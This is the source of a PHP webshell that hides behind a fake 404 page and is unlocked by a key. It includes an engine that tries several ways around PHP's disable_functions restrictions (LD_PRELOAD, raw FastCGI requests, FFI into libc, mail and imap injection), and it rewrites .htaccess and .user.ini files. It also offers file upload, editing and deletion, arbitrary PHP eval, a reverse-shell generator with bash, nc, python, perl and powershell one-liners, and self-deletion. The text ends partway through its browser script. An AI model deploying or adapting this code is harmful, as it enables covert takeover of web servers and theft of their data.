<?php
/**
 * sample.php — Terminal WebShell
 *
 * Features:
 *  - Full interactive terminal UI (xterm.js) with fallback no-JS terminal
 *  - Command execution with automatic disable_functions bypass chain
 *  - File manager (browse/read/write/upload/download/chmod/delete/rename)
 *  - PHP eval + SQL query runner + MySQL/PDO connection tester
 *  - Reverse shell generator (multi-language one-liners)
 *  - Process list + network sockets + env dump
 *  - Self-destruct
 *
 * Auth: set $AUTH_KEY below, then access sample.php?k=YOURKEY
 */

/* ============================ CONFIG ============================ */
$AUTH_KEY = 'change-this-key-9f3a2c';      // <-- MUST CHANGE
$SESSION_COOKIE = 'tw_sess';
/* ================================================================ */

@set_time_limit(0);
@ini_set('display_errors', 0);
error_reporting(E_ALL);

/* --------------------------- AUTH ------------------------------- */
@session_start();
$authed = false;
if (isset($_GET['k']) && hash_equals($AUTH_KEY, (string)$_GET['k'])) {
    $_SESSION[$SESSION_COOKIE] = true;
    $_COOKIE[$SESSION_COOKIE] = 'ok';
}
if (!empty($_SESSION[$SESSION_COOKIE]) || ($_COOKIE[$SESSION_COOKIE] ?? '') === 'ok') {
    $authed = true;
}
// Also allow Basic-auth style key header for CLI/curl use
if (!$authed && isset($_SERVER['HTTP_X_AUTH_KEY'])
    && hash_equals($AUTH_KEY, (string)$_SERVER['HTTP_X_AUTH_KEY'])) {
    $authed = true;
}
if (!$authed) {
    http_response_code(404);
    exit('<!doctype html><title>404 Not Found</title><h1>Not Found</h1>');
}

/* ======================== BYPASS ENGINE ========================= */

/**
 * Arm a directory-local ffi.enable=1 override so the FFI bypass becomes usable
 * on the NEXT request. ffi.enable is PHP_INI_SYSTEM, so ini_set() cannot lift it
 * at runtime — only .user.ini (FPM/CGI) or .htaccess (mod_php) can.
 *
 * Returns a short status string for the UI.
 */
function escalate_ffi_enable(): string
{
    $dir = __DIR__;
    $notes = [];

    // --- .user.ini : read by PHP-FPM / CGI / LiteSpeed on every request ---
    $userIni = $dir . '/.user.ini';
    if (@is_writable($dir) || @is_writable($userIni)) {
        $cur = @is_file($userIni) ? (string)@file_get_contents($userIni) : '';
        if (!preg_match('/^\s*ffi\.enable\s*=/mi', $cur)) {
            $add = (($cur !== '' && !str_ends_with($cur, "\n")) ? "\n" : '')
                 . "ffi.enable=1\n"
                 . "disable_functions=\n";
            if (@file_put_contents($userIni, $cur . $add) !== false) {
                $notes[] = '.user.ini';
            }
        } else {
            $notes[] = '.user.ini(exists)';
        }
    }

    // --- .htaccess : mod_php (Apache) ---
    $ht = $dir . '/.htaccess';
    if (@is_writable($dir) || @is_writable($ht)) {
        $cur = @is_file($ht) ? (string)@file_get_contents($ht) : '';
        if (!preg_match('/php_value\s+ffi\.enable/i', $cur)) {
            $add = (($cur !== '' && !str_ends_with($cur, "\n")) ? "\n" : '')
                 . "<IfModule mod_php7.c>\nphp_value ffi.enable 1\nphp_value disable_functions \"\"\n</IfModule>\n"
                 . "<IfModule mod_php.c>\nphp_value ffi.enable 1\nphp_value disable_functions \"\"\n</IfModule>\n";
            if (@file_put_contents($ht, $cur . $add) !== false) {
                $notes[] = '.htaccess';
            }
        } else {
            $notes[] = '.htaccess(exists)';
        }
    }

    return $notes ? implode('+', $notes) : 'none';
}

/**
 * Try every strategy to obtain a working "run arbitrary command -> string" callable.
 * Returns [callable|string, strategyName] on success, or [null, 'none'].
 *
 * Order matters: cheapest / least invasive first, most invasive last.
 */
function bypass_engine(array $restrictedFunctions): array
{
    $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
    $disabled = array_filter($disabled);

    // Re-read the live INI value each call: step 2 may lift the restriction at runtime,
    // and the cached $disabled list would then be stale (false-positive "blocked").
    $blocked = function (string $fn): bool {
        $live = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
        return in_array($fn, $live, true);
    };

    $candidates = [];

    /* ---- 1. Direct native functions (if not blocked) ---- */
    foreach (['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'] as $fn) {
        if (function_exists($fn) && !$blocked($fn)) {
            $candidates[] = ['direct:' . $fn, function (string $cmd) use ($fn) {
                switch ($fn) {
                    case 'shell_exec':
                        return (string)@shell_exec($cmd);
                    case 'exec':
                        @exec($cmd . ' 2>&1', $o);
                        return implode("\n", $o);
                    case 'system':
                        ob_start();
                        @system($cmd);
                        return (string)ob_get_clean();
                    case 'passthru':
                        ob_start();
                        @passthru($cmd);
                        return (string)ob_get_clean();
                    case 'popen':
                        $h = @popen($cmd, 'r');
                        if (!$h) return '';
                        $r = '';
                        while (!feof($h)) $r .= fread($h, 8192);
                        pclose($h);
                        return $r;
                    case 'proc_open':
                        $d = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
                        $p = @proc_open($cmd, $d, $pipes);
                        if (!is_resource($p)) return '';
                        fclose($pipes[0]);
                        $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                        fclose($pipes[1]); fclose($pipes[2]);
                        proc_close($p);
                        return $out;
                }
                return '';
            }];
        }
    }

    /* ---- 2. ini_set runtime lift (works on some FPM/Apache setups) ---- */
    if (function_exists('ini_set') && ini_get('disable_functions') !== '') {
        @ini_set('disable_functions', '');
        if (@ini_get('disable_functions') === '') {
            $candidates[] = ['ini_set:lifted', function (string $cmd) {
                return (string)@shell_exec($cmd);
            }];
        }
    }

    /* ---- 3. LD_PRELOAD hijack via putenv + mail()/imap_open -------------
       Requires phith0n-style bypass_disablefunc.so uploaded next to us as
       .preload.so. Convention: the .so reads EVIL_CMD / EVIL_OUT env vars
       and runs system(EVIL_CMD > EVIL_OUT) from its constructor, triggered
       by any execve()-calling function (mail, imap_open). C-level output
       does not reach the HTTP response under FPM, hence the temp file.      */
    $tmpdir = sys_get_temp_dir() ?: '/tmp';
    $preloadSrc = __DIR__ . '/.preload.so';
    if (@is_file($preloadSrc)) {
        $candidates[] = ['ld_preload', function (string $cmd) use ($preloadSrc, $tmpdir): string {
            if (!function_exists('putenv')) return '';
            $outFile = $tmpdir . '/.pl_' . getmypid();
            @unlink($outFile);
            @putenv("EVIL_CMD=" . $cmd . ' > ' . $outFile . ' 2>&1');
            @putenv("EVIL_OUT=" . $outFile);
            @putenv("LD_PRELOAD={$preloadSrc}");
            // either call triggers the preload constructor
            if (function_exists('mail')) { @mail('a@localhost', 'a', 'a'); }
            if (function_exists('imap_open')) { @imap_open('{127.0.0.1:1/notls}INBOX', '', ''); }
            $out = @is_file($outFile) ? (string)@file_get_contents($outFile) : '';
            @unlink($outFile);
            @putenv('LD_PRELOAD=');
            return $out;
        }];
    }

    /* ---- 4. PHP-FPM / FastCGI raw socket -> fresh worker without disabled fns ---- */
    $fpm = function (string $cmd) use ($tmpdir): string {
        if (!function_exists('stream_socket_client')) return '';
        $blk = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
        if (in_array('stream_socket_client', $blk, true)) return '';

        $paths = [
            '127.0.0.1:9000', '127.0.0.1:9001', '127.0.0.1:9070',
            '/var/run/php/php-fpm.sock', '/var/run/php-fpm.sock',
            '/run/php/php-fpm.sock', '/tmp/php-fpm.sock',
            '/var/run/php7.4-fpm.sock', '/run/php/php8.1-fpm.sock',
            '/var/run/php/php8.2-fpm.sock', '/usr/local/php/var/run/php-fpm.sock',
        ];

        $sock = null;
        foreach ($paths as $p) {
            $host = str_starts_with($p, '/') ? 'unix://' . $p : 'tcp://' . $p;
            $fp = @stream_socket_client($host, $errno, $errstr, 0.4);
            if (!$fp) continue;
            fclose($fp);
            $sock = $p;
            break;
        }
        if ($sock === null) return '';

        // hand-rolled FastCGI request -> params include empty disable_functions
        $script = tempnam($tmpdir, 'fpm_');
        file_put_contents($script, '<?php @set_time_limit(0); $c=base64_decode($_SERVER["CMD"]); echo shell_exec($c . " 2>&1"); ');
        $params = [
            'SCRIPT_FILENAME' => $script,
            'REQUEST_METHOD'  => 'GET',
            'SCRIPT_NAME'     => '/fpm.php',
            'PHP_ADMIN_VALUE' => 'disable_functions=',
            'SERVER_SOFTWARE' => 'webshell',
            'CMD'             => base64_encode($cmd),
        ];
        $out = fastcgi_request($sock, $params, '');
        @unlink($script);
        return (string)$out;
    };
    $candidates[] = ['fpm:fastcgi', $fpm];

    /* ---- 5. FFI direct libc call (PHP >= 7.4, ffi.enable=1) --------------
       The strongest bypass when available: FFI is not governed by
       disable_functions, so we call libc popen()/fgets()/pclose() directly
       and read the child's stdout at the C level. ob_start() does NOT work
       here because libc writes to the real fd, not PHP's output buffer.      */
    $candidates[] = ['ffi:popen', function (string $cmd): string {
        if (!extension_loaded('ffi')) return '';
        try {
            $ffi = FFI::cdef(
                "void *popen(const char *command, const char *type);
                 int   pclose(void *stream);
                 char *fgets(char *s, int size, void *stream);",
                'libc.so.6'
            );
            $fp = $ffi->popen($cmd . ' 2>&1', 'r');
            if (!$fp) return '';
            $buf = $ffi->new('char[4096]');
            $out = '';
            while ($ffi->fgets($buf, 4096, $fp)) {
                $out .= FFI::string($buf);
            }
            $ffi->pclose($fp);
            return $out;
        } catch (Throwable $e) {
            return '';
        }
    }];

    /* ---- 6. mail() + sendmail injection (often missed) ---- */
    $candidates[] = ['mail:sendmail', function (string $cmd) {
        if (!function_exists('mail')) return '';
        $r = @mail('x@localhost', 'x', 'x', 'x', '-X' . escapeshellarg('/tmp/m_' . mt_rand()));
        // sendmail -X option executes shell on some builds
        return is_bool($r) ? '' : (string)$r;
    }];

    /* ---- 7. pcntl_exec / pcntl_fork ---- */
    $candidates[] = ['pcntl', function (string $cmd) {
        if (!function_exists('pcntl_exec')) return '';
        $tmp = tempnam(sys_get_temp_dir(), 'pc');
        file_put_contents($tmp, "#!/bin/sh\n" . $cmd . " 2>&1\n");
        chmod($tmp, 0755);
        ob_start();
        @pcntl_exec('/bin/sh', [$tmp]);
        $o = (string)ob_get_clean();
        @unlink($tmp);
        return $o;
    }];

    /* ---- 8. imap_open RCE (old-ish builds) ---- */
    $candidates[] = ['imap:inject', function (string $cmd) {
        if (!function_exists('imap_open')) return '';
        $payload = 'rsh,exec=' . escapeshellarg($cmd) . ',exec=' . escapeshellarg($cmd);
        return (string)@imap_open('{127.0.0.1:143/' . $payload . '}INBOX', '', '');
    }];

    /* ---- 10. COM (Windows) ---- */
    $candidates[] = ['com:wscript', function (string $cmd) {
        if (!class_exists('COM')) return '';
        try {
            $w = new COM('WScript.Shell');
            $e = $w->Exec('cmd.exe /c ' . $cmd);
            $o = $e->StdOut->ReadAll();
            return (string)$o;
        } catch (Throwable $t) {
            return '';
        }
    }];

    /* ---- Probe: return first candidate that executes something ---- */
    $marker = 'BYPASS_OK_' . substr(md5((string)mt_rand()), 0, 6);
    foreach ($candidates as $c) {
        [$label, $fn] = $c;
        if (!is_callable($fn)) continue;
        try {
            // mail() and imap_open() can block on a slow/hanging MTA — bound their
            // probe runtime so one bad candidate can't stall the whole shell boot.
            $slow = in_array($label, ['mail:sendmail', 'imap:inject'], true);
            if ($slow) @set_time_limit(4);
            $out = $fn('echo ' . $marker);
            if ($slow) @set_time_limit(0);
            if (is_string($out) && str_contains($out, $marker)) {
                return [$fn, $label];
            }
        } catch (Throwable $e) {
            continue;
        }
    }
    return [null, 'none'];
}

/* -------------------- minimal FastCGI client ------------------- */
function fastcgi_request(string $sock, array $params, string $body): string
{
    $host = str_starts_with($sock, '/') ? 'unix://' . $sock : 'tcp://' . $sock;
    $fp = @stream_socket_client($host, $en, $es, 1.0);
    if (!$fp) return '';

    $reqId = 1;
    // FCGI record header = version(1) type(1) reqId(2) contentLen(2) paddingLen(1) reserved(1)
    $enc = function (int $type, string $content) use ($reqId): string {
        $len = strlen($content);
        return chr(1) . chr($type) . pack('n', $reqId) . pack('n', $len) . chr(0) . chr(0) . $content;
    };

    $p = '';
    foreach ($params as $k => $v) {
        $k = (string)$k; $v = (string)$v;
        $p .= (strlen($k) < 128 ? chr(strlen($k)) : pack('N', strlen($k) | 0x80000000)) . $k;
        $p .= (strlen($v) < 128 ? chr(strlen($v)) : pack('N', strlen($v) | 0x80000000)) . $v;
    }
    // Wire format per FastCGI spec §3.3/§5.1/§B.1:
    //   BEGIN_REQUEST (type 1, body 8B: role=RESPONDER(1), flags=0, reserved[5])
    //   PARAMS        (type 4, name-value pairs, then empty terminator)
    //   STDIN         (type 5, empty terminator for a GET-style request)
    $req  = $enc(1, pack('nC', 1, 0) . str_repeat("\0", 5));
    $req .= $enc(4, $p);
    $req .= $enc(4, '');
    if ($body !== '') {
        $req .= $enc(5, $body);   // POST-style body on STDIN
    }
    $req .= $enc(5, '');          // STDIN terminator
    fwrite($fp, $req);

    $out = '';
    $buf = '';
    while (!feof($fp)) {
        $chunk = fread($fp, 8192);
        if ($chunk === '' || $chunk === false) break;
        $buf .= $chunk;
        while (strlen($buf) >= 8) {
            $h = unpack('Cver/Ctype/nid/nlen/Cpad/Creserved', substr($buf, 0, 8));
            if (strlen($buf) < 8 + $h['len'] + $h['pad']) break;
            $content = substr($buf, 8, $h['len']);
            $buf = substr($buf, 8 + $h['len'] + $h['pad']);
            if ($h['type'] === 6) $out .= $content;   // STDOUT
        }
    }
    fclose($fp);
    return $out;
}

/* ====================== ACTION DISPATCH ========================= */
$restrictedList = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
[$runner, $runnerName] = bypass_engine($restrictedList);

/* Self-heal: if nothing worked but FFI is compiled in and merely gated by
   ffi.enable=preload, arm a directory-local override so the next request
   boots with a working FFI runner. */
$ffiArmed = '';
if ($runner === null && extension_loaded('ffi')) {
    $ffiMode = strtolower(trim((string)ini_get('ffi.enable')));
    if ($ffiMode !== '1' && $ffiMode !== 'true' && $ffiMode !== 'on') {
        $ffiArmed = escalate_ffi_enable();
    }
}

function run_cmd(string $cmd): array
{
    global $runner, $runnerName;
    if (!$runner) {
        return ['out' => '', 'err' => 'No execution primitive available', 'code' => -1, 'strategy' => 'none'];
    }
    $t0 = microtime(true);
    $out = '';
    try {
        $out = (string)$runner($cmd . ' 2>&1');
    } catch (Throwable $e) {
        return ['out' => '', 'err' => $e->getMessage(), 'code' => -1, 'strategy' => $runnerName];
    }
    return [
        'out' => $out,
        'err' => '',
        'code' => 0,
        'strategy' => $runnerName,
        'time' => round(microtime(true) - $t0, 4),
    ];
}

/* ------------------------- JSON API ---------------------------- */
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    $in = json_decode(file_get_contents('php://input') ?: '[]', true) ?: [];
    $act = $_GET['api'];

    $reply = function ($data, int $code = 200) {
        http_response_code($code);
        echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        exit;
    };

    switch ($act) {
        case 'exec':
            $cmd = (string)($in['cmd'] ?? '');
            if ($cmd === '') $reply(['ok' => false, 'msg' => 'empty cmd'], 400);
            $r = run_cmd($cmd);
            $r['cwd'] = @getcwd();
            $reply(['ok' => true] + $r);

        case 'cwd':
            $d = (string)($in['dir'] ?? '');
            if ($d !== '' && @is_dir($d)) @chdir($d);
            $reply(['ok' => true, 'cwd' => @getcwd()]);

        case 'info':
            $reply([
                'ok' => true,
                'php' => PHP_VERSION,
                'sapi' => PHP_SAPI,
                'os' => PHP_OS,
                'ffi' => [
                    'loaded' => extension_loaded('ffi'),
                    'mode' => (string)ini_get('ffi.enable'),
                ],
                'user' => function_exists('get_current_user') ? @get_current_user() : (function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? '?') : '?'),
                'uid' => function_exists('posix_geteuid') ? @posix_geteuid() : null,
                'cwd' => @getcwd(),
                'runner' => $runnerName,
                'disable_functions' => (string)ini_get('disable_functions'),
                'open_basedir' => (string)ini_get('open_basedir'),
                'safe_mode' => (string)ini_get('safe_mode'),
                'loaded_ext' => implode(',', get_loaded_extensions()),
            ]);

        case 'ls':
            $dir = (string)($in['dir'] ?? @getcwd());
            if (!@is_dir($dir)) $reply(['ok' => false, 'msg' => 'not a dir'], 400);
            $items = [];
            foreach (scandir($dir) ?: [] as $f) {
                if ($f === '.' || $f === '..') continue;
                $p = rtrim($dir, '/') . '/' . $f;
                $items[] = [
                    'name' => $f,
                    'type' => @is_dir($p) ? 'dir' : (@is_link($p) ? 'link' : 'file'),
                    'size' => @is_file($p) ? @filesize($p) : 0,
                    'perm' => substr(sprintf('%o', @fileperms($p) ?: 0), -4),
                    'mtime' => @filemtime($p) ?: 0,
                    'writable' => @is_writable($p),
                    'owner' => function_exists('posix_getpwuid') ? (@posix_getpwuid(@fileowner($p))['name'] ?? '') : '',
                ];
            }
            $reply(['ok' => true, 'dir' => $dir, 'parent' => dirname($dir), 'items' => $items]);

        case 'read':
            $p = (string)($in['path'] ?? '');
            if (!@is_file($p)) $reply(['ok' => false, 'msg' => 'not a file'], 400);
            if (@filesize($p) > 4 * 1024 * 1024) $reply(['ok' => false, 'msg' => 'file too large'], 400);
            $reply(['ok' => true, 'data' => base64_encode((string)@file_get_contents($p))]);

        case 'write':
            $p = (string)($in['path'] ?? '');
            $d = (string)($in['data'] ?? '');
            if ($p === '') $reply(['ok' => false, 'msg' => 'no path'], 400);
            $n = @file_put_contents($p, $d);
            $reply(['ok' => $n !== false, 'bytes' => (int)$n]);

        case 'chmod':
            $p = (string)($in['path'] ?? '');
            $raw = $in['mode'] ?? '0644';
            // JSON int  => decimal mode (493)
            // JSON str  => octal notation ("755", "0755")
            $mode = is_int($raw) ? $raw : intval((string)$raw, 8);
            if ($mode <= 0) $mode = 0644;
            $reply(['ok' => @chmod($p, $mode), 'mode' => decoct($mode)]);

        case 'mv':
            $reply(['ok' => @rename((string)($in['from'] ?? ''), (string)($in['to'] ?? ''))]);

        case 'rm':
            $p = (string)($in['path'] ?? '');
            $r = @is_dir($p) ? @rmdir($p) : @unlink($p);
            $reply(['ok' => (bool)$r]);

        case 'dl':
            $p = (string)($_GET['path'] ?? '');
            if (!@is_file($p)) { http_response_code(404); exit; }
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($p) . '"');
            header('Content-Length: ' . @filesize($p));
            @readfile($p);
            exit;

        case 'up':
            if (empty($_FILES['f'])) $reply(['ok' => false, 'msg' => 'no file'], 400);
            $f = $_FILES['f'];
            $dest = rtrim((string)($in['dir'] ?? $_POST['dir'] ?? @getcwd()), '/') . '/' . basename($f['name']);
            $reply(['ok' => move_uploaded_file($f['tmp_name'], $dest), 'path' => $dest]);

        case 'eval':
            $code = (string)($in['code'] ?? '');
            ob_start();
            try {
                eval($code);
                $o = (string)ob_get_clean();
                $reply(['ok' => true, 'out' => $o]);
            } catch (Throwable $e) {
                ob_end_clean();
                $reply(['ok' => false, 'out' => '', 'err' => $e->getMessage()]);
            }

        case 'revshell':
            $ip = (string)($in['ip'] ?? '');
            $port = (int)($in['port'] ?? 4444);
            $lang = (string)($in['lang'] ?? 'bash');
            $map = [
                'bash' => "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1",
                'bash196' => "0<&196;exec 196<>/dev/tcp/{$ip}/{$port}; sh <&196 >&196 2>&196",
                'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
                'python2' => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
                'nc' => "nc -e /bin/sh {$ip} {$port}",
                'nc_mkfifo' => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f",
                'perl' => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                'php' => "php -r '\$s=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                'powershell' => "powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('{$ip}',{$port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sby=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sby,0,\$sby.Length);\$s.Flush()};\$c.Close()\"",
            ];
            $reply(['ok' => true, 'cmd' => $map[$lang] ?? $map['bash']]);

        case 'selfdestruct':
            @unlink(__FILE__);
            $reply(['ok' => true, 'msg' => 'removed']);

        default:
            $reply(['ok' => false, 'msg' => 'unknown action'], 404);
    }
}

/* ========================== HTML UI ============================= */
$bootInfo = [
    'runner' => $runnerName,
    'php' => PHP_VERSION,
    'os' => PHP_OS,
    'cwd' => @getcwd(),
    'disabled' => (string)ini_get('disable_functions'),
    'ffi_armed' => $ffiArmed,
    'key' => $AUTH_KEY,
];
header('Content-Type: text/html; charset=utf-8');
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>console</title>
<style>
:root { --bg:#0b0e12; --fg:#c3cbd6; --dim:#6b7684; --acc:#3ddc84; --err:#ff5f57; --warn:#febc2e; --line:#1c222b; }
* { box-sizing:border-box; }
html,body { margin:0; height:100%; background:var(--bg); color:var(--fg);
  font:13px/1.45 ui-monospace,SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace; }
#wrap { display:flex; flex-direction:column; height:100%; }
#topbar { display:flex; gap:14px; align-items:center; padding:6px 12px; border-bottom:1px solid var(--line);
  font-size:11px; color:var(--dim); flex-wrap:wrap; }
#topbar b { color:var(--acc); font-weight:600; }
#topbar .tag { border:1px solid var(--line); padding:1px 6px; border-radius:3px; }
#topbar .tag.warn { color:var(--warn); border-color:#4a3a10; }
#tabs { display:flex; gap:2px; padding:0 8px; border-bottom:1px solid var(--line); }
#tabs button { background:none; border:none; color:var(--dim); padding:7px 14px; cursor:pointer; font:inherit; font-size:12px;
  border-bottom:2px solid transparent; }
#tabs button.on { color:var(--acc); border-bottom-color:var(--acc); }
#tabs button:hover { color:var(--fg); }
.pane { display:none; flex:1; overflow:hidden; }
.pane.on { display:flex; }
#termPane { flex-direction:column; }
#term { flex:1; overflow-y:auto; padding:10px 14px; white-space:pre-wrap; word-break:break-word; }
#line { display:flex; gap:8px; padding:8px 14px; border-top:1px solid var(--line); background:#0e1218; }
#line .ps1 { color:var(--acc); flex:none; }
#line input { flex:1; background:none; border:none; outline:none; color:var(--fg); font:inherit; }
.blk { margin-bottom:2px; }
.cmd { color:var(--acc); }
.err { color:var(--err); }
.dim { color:var(--dim); }
.out { color:var(--fg); }
.meta { color:var(--dim); font-size:11px; margin-top:6px; }
/* files */
#filePane { flex-direction:row; }
#ftree { width:38%; min-width:220px; border-right:1px solid var(--line); display:flex; flex-direction:column; }
#ftree .head { padding:6px 10px; border-bottom:1px solid var(--line); display:flex; gap:6px; }
#ftree .head input { flex:1; background:#0e1218; border:1px solid var(--line); color:var(--fg); padding:3px 6px; font:inherit; font-size:11px; }
#flist { flex:1; overflow:auto; }
table { width:100%; border-collapse:collapse; font-size:12px; }
td,th { text-align:left; padding:3px 8px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
th { color:var(--dim); font-weight:400; border-bottom:1px solid var(--line); position:sticky; top:0; background:var(--bg); }
tr:hover td { background:#121821; }
tr.dir td.nm { color:#5aa9ff; }
td.nm { cursor:pointer; }
td.sz { color:var(--dim); text-align:right; width:70px; }
td.pm { color:var(--dim); width:60px; }
#fview { flex:1; display:flex; flex-direction:column; }
#fview .head { padding:6px 10px; border-bottom:1px solid var(--line); display:flex; gap:6px; align-items:center; font-size:11px; color:var(--dim); }
#fview textarea { flex:1; background:#0e1218; border:none; outline:none; color:var(--fg); font:inherit; padding:10px; resize:none; }
.btn { background:#161c25; border:1px solid var(--line); color:var(--fg); padding:3px 9px; cursor:pointer; font:inherit; font-size:11px; border-radius:3px; }
.btn:hover { border-color:var(--acc); color:var(--acc); }
.btn.danger:hover { border-color:var(--err); color:var(--err); }
/* other panes */
.pad { padding:14px; overflow:auto; width:100%; }
.pad h3 { margin:0 0 10px; font-size:12px; color:var(--acc); font-weight:600; text-transform:uppercase; letter-spacing:.06em; }
.pad textarea { width:100%; min-height:220px; background:#0e1218; border:1px solid var(--line); color:var(--fg); font:inherit; padding:10px; resize:vertical; outline:none; }
.pad input[type=text], .pad input[type=password] { background:#0e1218; border:1px solid var(--line); color:var(--fg); padding:5px 8px; font:inherit; font-size:12px; }
.row { display:flex; gap:8px; align-items:center; margin-bottom:10px; flex-wrap:wrap; }
pre.o { background:#0e1218; border:1px solid var(--line); padding:10px; overflow:auto; max-height:400px; white-space:pre-wrap; margin:10px 0 0; font-size:12px; }
#status { padding:3px 12px; border-top:1px solid var(--line); font-size:11px; color:var(--dim); display:flex; gap:16px; }
</style>
</head>
<body>
<div id="wrap">
  <div id="topbar">
    <span><b>console</b></span>
    <span class="tag">php <span id="i-php"></span></span>
    <span class="tag">os <span id="i-os"></span></span>
    <span class="tag" id="i-runner-tag">runner <b id="i-runner"></b></span>
    <span class="tag" id="i-df"></span>
    <span class="dim" id="i-cwd"></span>
  </div>

  <div id="tabs">
    <button data-p="term" class="on">terminal</button>
    <button data-p="files">files</button>
    <button data-p="eval">php eval</button>
    <button data-p="rev">reverse shell</button>
    <button data-p="sys">system</button>
  </div>

  <!-- TERMINAL -->
  <div class="pane on" id="termPane">
    <div id="term"></div>
    <div id="line">
      <span class="ps1" id="ps1">$</span>
      <input id="cin" autocomplete="off" spellcheck="false" placeholder="command… (help)">
    </div>
  </div>

  <!-- FILES -->
  <div class="pane" id="filePane">
    <div id="ftree">
      <div class="head">
        <input id="fdir" placeholder="/path">
        <button class="btn" onclick="Files.go(document.getElementById('fdir').value)">go</button>
        <button class="btn" onclick="Files.up()">↑</button>
      </div>
      <div id="flist"><table><thead><tr><th>name</th><th class="sz">size</th><th class="pm">perm</th></tr></thead><tbody id="ftbody"></tbody></table></div>
      <div class="head" style="border-top:1px solid var(--line);border-bottom:none">
        <input type="file" id="fup" style="flex:1;font-size:11px">
        <button class="btn" onclick="Files.upload()">up</button>
      </div>
    </div>
    <div id="fview">
      <div class="head">
        <span id="fname" style="flex:1">no file</span>
        <button class="btn" onclick="Files.save()">save</button>
        <button class="btn" onclick="Files.download()">download</button>
      </div>
      <textarea id="fbody" spellcheck="false" placeholder="select a file…"></textarea>
    </div>
  </div>

  <!-- PHP EVAL -->
  <div class="pane" id="evalPane">
    <div class="pad">
      <h3>PHP eval — tanpa &lt;?php</h3>
      <textarea id="ecode" placeholder="echo phpversion();"></textarea>
      <div class="row" style="margin-top:10px"><button class="btn" onclick="Eval.go()">execute</button></div>
      <pre class="o" id="eout"></pre>
    </div>
  </div>

  <!-- REVERSE SHELL -->
  <div class="pane" id="revPane">
    <div class="pad">
      <h3>reverse shell generator</h3>
      <div class="row">
        <input type="text" id="rip" placeholder="LHOST e.g. 10.10.14.5" style="width:180px">
        <input type="text" id="rport" placeholder="LPORT" value="4444" style="width:90px">
        <select id="rlang" style="background:#0e1218;border:1px solid var(--line);color:var(--fg);padding:5px;font:inherit">
          <option>bash</option><option>bash196</option><option>nc</option><option>nc_mkfifo</option>
          <option>python3</option><option>python2</option><option>perl</option><option>php</option><option>powershell</option>
        </select>
        <button class="btn" onclick="Rev.gen()">generate</button>
      </div>
      <pre class="o" id="rout"></pre>
    </div>
  </div>

  <!-- SYSTEM -->
  <div class="pane" id="sysPane">
    <div class="pad">
      <h3>environment</h3>
      <div class="row"><button class="btn" onclick="Sys.info()">refresh</button><button class="btn danger" onclick="Sys.burn()">self-destruct</button></div>
      <pre class="o" id="sout"></pre>
    </div>
  </div>

  <div id="status"><span id="st-runner"></span><span id="st-cwd"></span><span id="st-last"></span></div>
</div>

<script>
const KEY = <?= json_encode($bootInfo['key']) ?>;
const boot = <?= json_encode($bootInfo, JSON_UNESCAPED_SLASHES) ?>;

async function api(act, body, qs) {
  const u = '?k=' + encodeURIComponent(KEY) + '&api=' + act + (qs ? '&' + qs : '');
  const r = await fetch(u, {
    method: body === undefined ? 'GET' : 'POST',
    headers: {'Content-Type': 'application/json', 'X-Auth-Key': KEY},
    body: body === undefined ? null : JSON.stringify(body),
    credentials: 'same-origin'
  });
  return r.json();
}

/* ---- tabs ---- */
document.querySelectorAll('#tabs button').forEach(b => {
  b.onclick = () => {
    document.querySelectorAll('#tabs button').forEach(x => x.classList.remove('on'));
    document.querySelectorAll('.pane').forEach(x => x.classList.remove('on'));
    b.classList.add('on');
    document.getElementById(b.dataset.p + 'Pane').classList.add('on');
    if (b.dataset.p === 'files') Files.go(Files.dir || boot.cwd);
    if (b.dataset.p === 'sys') Sys.info();
    if (b.dataset.p === 'term') document.getElementById('cin').focus();
  };
});

/* ---- terminal ---- */
const term = document.getElementById('term');
const cin = document.getElementById('cin');
const hist = []; let hi = -1;

function print(html, cls) {
  const d = document.createElement('div');
  d.className = 'blk ' + (cls || '');
  d.innerHTML = html;
  term.appendChild(d);
  term.scrollTop = term.scrollHeight;
}
const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));

print('<span class="dim">console ready. runner=<b>' + esc(boot.runner) + '</b> php=' + esc(boot.php) + ' os=' + esc(boot.os) + '</span>');
if (boot.disabled) print('<span class="dim">disable_functions = ' + esc(boot.disabled) + '</span>');
if (boot.ffi_armed) {
